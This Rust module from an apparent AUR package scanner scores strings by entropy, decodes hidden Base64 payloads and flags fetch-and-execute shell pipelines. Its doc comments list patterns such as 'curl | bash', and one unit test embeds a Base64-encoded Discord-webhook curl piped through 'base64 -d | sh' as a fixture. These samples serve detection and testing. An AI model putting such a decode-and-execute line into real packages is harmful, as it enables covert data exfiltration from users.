//! Advanced deep code analyzer for AUR packages.
//!
//! Features:
//! 1. Shannon Information Entropy analysis (detects packed blobs / shellcode).
//! 2. Recursive payload de-obfuscation (extracts, decodes, and scans hidden base64 payloads).
//! 3. Real shell-pipeline-structure detection (fetch-and-execute, decode-and-execute).

use crate::findings::{Behavior, Finding};
use crate::shellparse;
use base64::prelude::*;
use regex::Regex;
use std::sync::LazyLock;

static TOKEN_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"['"]([A-Za-z0-9+/=_-]{40,})['"]"#).unwrap());

static B64_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r#"['"]([A-Za-z0-9+/]{24,}={0,2})['"]"#).unwrap());

/// Compute Shannon Entropy in bits per byte (0.0 to 8.0).
/// Normal text/code: ~3.0 - 4.5
/// Base64 encoded / encrypted / packed data: > 5.0
pub fn shannon_entropy(s: &str) -> f64 {
    if s.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for &b in s.as_bytes() {
        counts[b as usize] += 1;
    }
    let len = s.len() as f64;
    let mut entropy = 0.0;
    for &count in &counts {
        if count > 0 {
            let p = count as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

/// Analyze string tokens for high Shannon entropy (packed/encrypted payloads).
pub fn analyze_entropy(content: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (idx, line) in content.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.starts_with('#')
            || trimmed.starts_with("sha256sums")
            || trimmed.starts_with("sha512sums")
            || trimmed.starts_with("b2sums")
            || trimmed.starts_with("md5sums")
            || trimmed.starts_with("validpgpkeys")
            || trimmed.starts_with("source")
        {
            continue;
        }

        for cap in TOKEN_RE.captures_iter(line) {
            let token = &cap[1];
            // Skip pure hex checksums
            if (token.len() == 64 || token.len() == 128)
                && token.chars().all(|c| c.is_ascii_hexdigit())
            {
                continue;
            }

            let ent = shannon_entropy(token);
            if ent > 5.2 {
                findings.push(Finding {
                    rule_id: "SUS_HIGH_ENTROPY_PAYLOAD".into(),
                    severity: "HIGH".into(),
                    description: format!(
                        "High Shannon entropy ({:.2} bits/byte) detected in string literal - packed or encrypted payload",
                        ent
                    ),
                    line_number: idx + 1,
                    matched_text: format!(
                        "{}... (entropy: {:.2})",
                        &token[..token.len().min(40)],
                        ent
                    ),
                    behavior: Behavior::Obfuscation,
                });
            }
        }
    }
    findings
}

/// Recursively extract, de-obfuscate, and scan hidden Base64 payloads.
/// `rescan` runs the full scanner over each decoded payload; each inner
/// finding keeps its own behavior.
pub fn deobfuscate_and_scan(content: &str, rescan: impl Fn(&str) -> Vec<Finding>) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (idx, line) in content.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.starts_with('#')
            || trimmed.starts_with("sha256sums")
            || trimmed.starts_with("sha512sums")
            || trimmed.starts_with("b2sums")
            || trimmed.starts_with("md5sums")
        {
            continue;
        }

        for cap in B64_PATTERN.captures_iter(line) {
            let candidate = &cap[1];
            // Skip pure hex checksums
            if candidate.chars().all(|c| c.is_ascii_hexdigit()) {
                continue;
            }

            if let Ok(decoded_bytes) = BASE64_STANDARD.decode(candidate) {
                if let Ok(decoded_str) = String::from_utf8(decoded_bytes) {
                    // Recursively scan the un-obfuscated content
                    for inner in rescan(&decoded_str) {
                        findings.push(Finding {
                            rule_id: format!("DEOBFUSCATED_{}", inner.rule_id),
                            severity: "CRITICAL".into(),
                            description: format!(
                                "Payload decoded from Base64 on line {}: {}",
                                idx + 1,
                                inner.description
                            ),
                            line_number: idx + 1,
                            matched_text: format!(
                                "Decoded: {}",
                                inner.matched_text[..inner.matched_text.len().min(80)].trim()
                            ),
                            behavior: inner.behavior,
                        });
                    }
                }
            }
        }
    }
    findings
}

/// Real shell-pipeline-structure detection (vision section 6), additive to
/// the regex signature set above.
///
/// Uses [`crate::shellparse`] to tell an actually-executed pipeline apart
/// from a string that merely mentions the same tool names, catching:
///
/// - `curl <url> | bash` / `wget -O- <url> | sh` and multi-stage variants
///   like `curl <url> | tee /tmp/x | bash` (dangerous: a fetched remote
///   payload piped straight into an interpreter) — while leaving
///   `curl <url> -o file.tar.gz` (a normal source download, no pipe at all,
///   or one that writes to a real file) unflagged.
/// - `... | base64 -d | bash`-shaped obfuscated-execution pipelines, while
///   leaving `echo "mentions base64 -d"` (a string literal) unflagged,
///   since the base64 stage there was never a real pipeline stage in the
///   first place.
pub fn analyze_pipeline_structure(content: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    for (idx, line) in content.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.starts_with('#')
            || trimmed.starts_with("sha256sums")
            || trimmed.starts_with("sha512sums")
            || trimmed.starts_with("b2sums")
            || trimmed.starts_with("md5sums")
            || trimmed.starts_with("source")
        {
            continue;
        }
        if !trimmed.contains('|') {
            continue;
        }

        let stages = shellparse::pipeline_stages(line);
        if stages.len() < 2 {
            continue;
        }

        for (stage_idx, stage) in stages.iter().enumerate() {
            let later_stages = &stages[stage_idx + 1..];

            // curl/wget piped into an interpreter, anywhere downstream in
            // the pipeline (not just the immediately-next stage), and not
            // simply writing its output to a file.
            if shellparse::is_fetch_command(&stage.command)
                && !shellparse::fetch_writes_to_file(stage)
                && later_stages
                    .iter()
                    .any(|s| shellparse::is_shell_interpreter(&s.command))
            {
                let interp = later_stages
                    .iter()
                    .find(|s| shellparse::is_shell_interpreter(&s.command))
                    .map(|s| s.command.as_str())
                    .unwrap_or("shell");
                findings.push(Finding {
                    rule_id: "PIPELINE_FETCH_EXEC".into(),
                    severity: "CRITICAL".into(),
                    description: format!(
                        "remote fetch ({}) piped into a real pipeline stage executing '{}' \
                         (structurally-confirmed fetch-and-execute, not a string match)",
                        stage.command, interp
                    ),
                    line_number: idx + 1,
                    matched_text: stage.text.chars().take(120).collect(),
                    behavior: Behavior::DynamicDownload,
                });
            }

            // `base64 -d`/`--decode` as an actually-invoked pipeline stage,
            // with a later stage that executes the decoded output.
            if shellparse::is_base64_decode_stage(stage)
                && later_stages
                    .iter()
                    .any(|s| shellparse::is_shell_interpreter(&s.command))
            {
                findings.push(Finding {
                    rule_id: "PIPELINE_BASE64_EXEC".into(),
                    severity: "CRITICAL".into(),
                    description: "base64-decoded output piped directly into a shell interpreter \
                         (structurally-confirmed obfuscated execution, not just a string \
                         mentioning 'base64 -d')"
                        .to_string(),
                    line_number: idx + 1,
                    matched_text: stage.text.chars().take(120).collect(),
                    behavior: Behavior::Obfuscation,
                });
            }
        }
    }

    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn entropy_detects_high_entropy_blob() {
        let plain =
            "echo 'hello world this is a normal shell script line with standard english words'";
        assert!(shannon_entropy(plain) < 4.5);

        // Random high-entropy base64 blob
        let packed = "q83vB+xZ7LmK9pY2rNtU0wF6jC4hG1sE5aD3iO8uP7yX9zW0vT2rQ4mN6kL8jH1gF3eS5aD==";
        assert!(shannon_entropy(packed) > 5.0);
    }

    #[test]
    fn deobfuscator_rescans_decoded_payload_and_keeps_inner_behavior() {
        // Base64 of: curl https://discord.com/api/webhooks/123/xyz
        let b64 = "Y3VybCBodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjMveHl6";
        let script = format!("prepare() {{\n  echo \"{b64}\" | base64 -d | sh\n}}\n");

        let findings = deobfuscate_and_scan(&script, |decoded| {
            assert!(decoded.contains("discord.com/api/webhooks"));
            vec![Finding {
                rule_id: "EXFIL_DISCORD_WEBHOOK".into(),
                severity: "CRITICAL".into(),
                description: "webhook".into(),
                line_number: 1,
                matched_text: "discord.com/api/webhooks".into(),
                behavior: Behavior::NetworkAccess,
            }]
        });
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "DEOBFUSCATED_EXFIL_DISCORD_WEBHOOK");
        assert_eq!(findings[0].line_number, 2);
        assert_eq!(findings[0].behavior, Behavior::NetworkAccess);
    }

    #[test]
    fn entropy_handles_empty_and_uniform() {
        assert_eq!(shannon_entropy(""), 0.0);
        assert_eq!(shannon_entropy("aaaaaaa"), 0.0);
        // 4 different characters equally distributed has log2(4) = 2.0 entropy
        assert!((shannon_entropy("abcd") - 2.0).abs() < 1e-6);
    }
}
